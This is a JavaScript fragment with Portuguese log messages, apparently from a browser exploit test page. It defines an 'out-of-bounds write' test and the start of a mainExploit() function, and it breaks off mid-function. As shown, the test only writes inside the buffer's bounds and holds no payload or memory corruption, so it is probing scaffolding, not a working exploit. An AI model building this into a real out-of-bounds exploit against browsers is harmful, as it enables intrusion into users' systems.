        function refinedOOBWriteTest(view, bufferSize, offset, value) {
            log(`\n--- Teste de Offset ${offset} (Valor 0x${value.toString(16)}) ---`, 'critical');
            try {
                log(`refinedOOBWriteTest(): view = ${view}`);
                log(`refinedOOBWriteTest(): view.buffer = ${view ? view.buffer : null}`);
                const dataView = new DataView(view.buffer);
                log(`refinedOOBWriteTest(): DataView criado.`);
                log(`refinedOOBWriteTest(): Tentativa de escrita em offset ${offset} com valor 0x${value.toString(16)}`);
                if (offset >= 0 && offset < bufferSize) {
                    dataView.setUint8(offset, value);
                    log("refinedOOBWriteTest(): Escrita realizada.");
                    log(`refinedOOBWriteTest(): DataView após escrita: 0x${dataView.getUint8(offset).toString(16)}`);
                } else {
                    log("refinedOOBWriteTest(): Offset fora dos limites.", 'error');
                }
            } catch (writeError) {
                log(`Erro em refinedOOBWriteTest(): ${writeError}`, 'error');
            }
        }

        function mainExploit() {
            log("mainExploit() iniciado.", 'critical');
            const data = prepareData();
            if (data) {
                log("mainExploit(): prepareData() retornou dados.");
                refinedOOBWriteTest(data.view, data.bufferSize, 0, 0xAA); // Apenas uma escrita no offset 0
